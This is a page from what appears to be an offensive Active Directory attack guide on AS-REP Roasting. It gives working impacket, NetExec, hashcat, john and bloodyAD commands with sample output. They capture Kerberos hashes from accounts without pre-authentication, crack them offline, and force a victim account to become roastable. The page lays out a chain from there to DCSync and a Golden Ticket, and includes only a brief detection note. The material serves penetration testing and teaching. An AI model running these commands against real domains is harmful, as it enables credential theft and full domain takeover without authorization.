---
layout: default
title: "AS-REP Roasting"
order: 2
phase: "CRED"
tactic: "Credential Access"
summary: "Extract crackable Kerberos AS-REP hashes from accounts that do not require pre-authentication — often with no valid credentials at all."
---

{% include ad_nav.html %}

# AS-REP Roasting

## Pre-requisites

<div class="badges">
  <span class="badge req">TCP 88 to the DC</span>
  <span class="badge req">Username list (unauth) OR any domain creds (auth)</span>
  <span class="badge req">At least one account with pre-auth disabled</span>
</div>

- Network access to the KDC (port 88).
- Either a **list of candidate usernames** (unauthenticated variant) or **any single valid domain credential** (authenticated variant to enumerate the flag via LDAP).
- One or more accounts with the flag `DONT_REQ_PREAUTH` (UserAccountControl bit `0x400000`).

## Mechanism & Theory

Normally the KDC will not issue an `AS-REP` until the client proves it knows the password (pre-authentication: it encrypts a timestamp with the password-derived key). If an account has **"Do not require Kerberos pre-authentication"** enabled, the KDC will return an `AS-REP` **to anyone who asks**. Part of that reply — the *enc-part* — is encrypted with a key derived from the target user's password. We capture it offline and brute-force/dictionary-crack it to recover the plaintext password.

```terminal
Normal user:   AS-REQ ──► KDC ──► "prove it" (KDC_ERR_PREAUTH_REQUIRED)
Roastable user: AS-REQ ──► KDC ──► AS-REP { enc-part encrypted with UserPWkey }  ◄── crack this offline
```

Hash format is `$krb5asrep$23$user@REALM:<checksum>$<cipher>` where `23` = RC4-HMAC (etype 23), the fast-to-crack variant.

<div class="attack-diagram">
  <div class="diag-title">AS-REP Roasting — passwordless credential access</div>
  <div class="diag-flow">
    <div class="diag-node start"><span class="n-step">STEP 1</span><span class="n-title">Username list</span><span class="n-tool">no creds needed</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">STEP 2</span><span class="n-title">Ask KDC (no pre-auth)</span><span class="n-tool">GetNPUsers -no-pass</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">STEP 3</span><span class="n-title">AS-REP hash</span><span class="n-tool">$krb5asrep$23$</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">STEP 4</span><span class="n-title">Crack offline</span><span class="n-tool">hashcat -m 18200</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">STEP 5</span><span class="n-title">Plaintext password</span><span class="n-tool">svc_sql</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node win"><span class="n-step">STEP 6</span><span class="n-title">Authenticated</span><span class="n-tool">enumerate + pivot</span></div>
  </div>
</div>

## Step-by-step

### 1. Unauthenticated — spray a userlist

```bash
export DC=10.10.10.100
export DOMAIN=corp.local

impacket-GetNPUsers $DOMAIN/ -no-pass -usersfile valid_users.txt -dc-ip $DC -format hashcat -outputfile asrep_hashes.txt
```

```terminal
Impacket v0.12.0 - Copyright Fortra, LLC

[-] User jsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User m.rossi doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc_sql@CORP.LOCAL:1a2b3c...<snip>...ff00
[*] AS-REP hash written to asrep_hashes.txt
```

### 2. Authenticated — let LDAP find every roastable account

```bash
# With any valid credential, query the domain for the DONT_REQ_PREAUTH flag and roast all at once
impacket-GetNPUsers $DOMAIN/m.rossi:'Welcome2026!' -request -format hashcat -dc-ip $DC -outputfile asrep_hashes.txt

# NetExec module (same idea, integrates with your creds)
nxc ldap $DC -u m.rossi -p 'Welcome2026!' --asreproast asrep_hashes.txt
```

### 3. Manual LDAP hunt for the flag (bit 0x400000)

```bash
nxc ldap $DC -u m.rossi -p 'Welcome2026!' --query "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" "sAMAccountName"
```

Anatomy of the captured AS-REP hash (hashcat mode 18200):

```terminal
$krb5asrep$23$svc_sql@CORP.LOCAL:1a2b3c...ff00
     |        |   |               |
     |        |   |               +-- enc-part: encrypted with svc_sql's password-derived key (crack this)
     |        |   +----- principal @ REALM
     |        +--------- etype 23 = RC4-HMAC  (fast; 17/18 = AES, much slower)
     +------------------ AS-REP roast marker
```

### 4. Crack offline with Hashcat

```bash
# Mode 18200 = Kerberos 5 AS-REP etype 23
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked results
hashcat -m 18200 asrep_hashes.txt --show
```

```terminal
$krb5asrep$23$svc_sql@CORP.LOCAL:1a2b3c...ff00:Summer2026!
Session..........: hashcat
Status...........: Cracked
Recovered........: 1/1 (100.00%) Digests
```

John equivalent:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
john --show asrep_hashes.txt
```

## Complete Attack Chain

```terminal
[1] kerbrute userenum / GetNPUsers -no-pass  ─► svc_sql has pre-auth disabled
[2] GetNPUsers -no-pass -usersfile           ─► capture $krb5asrep$23$ hash
[3] hashcat -m 18200                          ─► svc_sql : Summer2026!
        │
[4] validate + situational awareness
        nxc smb $DC -u svc_sql -p 'Summer2026!'      (valid? local admin?)
        bloodhound-python -u svc_sql -p 'Summer2026!' ...
        │
[5] pivot depending on svc_sql rights:
        ├─ member of a privileged group?    ─► direct escalation
        ├─ has an SPN?                       ─► already cracked, else Kerberoast others
        ├─ GenericAll/WriteDacl over object? ─► ACL abuse
        └─ can enroll in a vuln template?    ─► AD CS ESC1..ESC8
        │
        ▼
   DCSync ─► Golden Ticket ─► full domain compromise
```

## Making an account roastable (post-exploitation)

If you gain `GenericAll`/`GenericWrite` over a user, you can *set* the pre-auth flag and roast them, recovering a crackable hash without changing their password:

```bash
# bloodyAD: flip UF_DONT_REQUIRE_PREAUTH on victim, roast, then flip back
bloodyAD -u m.rossi -p 'Welcome2026!' -d $DOMAIN --host $DC add uac target_user -f DONT_REQ_PREAUTH
impacket-GetNPUsers $DOMAIN/ -no-pass -usersfile <(echo target_user) -dc-ip $DC -format hashcat
bloodyAD -u m.rossi -p 'Welcome2026!' -d $DOMAIN --host $DC remove uac target_user -f DONT_REQ_PREAUTH
```

<div class="callout warning">
  <span class="callout-title">Cracking economics</span>
  etype 23 (RC4) AS-REP hashes crack fast. If you see <code>$krb5asrep$18$</code> (AES-256) it is far slower — prioritise RC4 hashes and strong GPU/rules first.
</div>

<div class="callout opsec">
  <span class="callout-title">Detection</span>
  AS-REP requests without pre-auth appear as <strong>Event ID 4768</strong> with pre-auth type 0. A spike of these to many accounts is a classic roasting indicator.
</div>

## Key Takeaways

- Zero-credential credential access whenever any account has pre-auth disabled.
- With one valid credential, LDAP enumerates every roastable account automatically.
- Always feed cracked service accounts straight into BloodHound to find the next hop.

{% include toc_sidebar.html %}
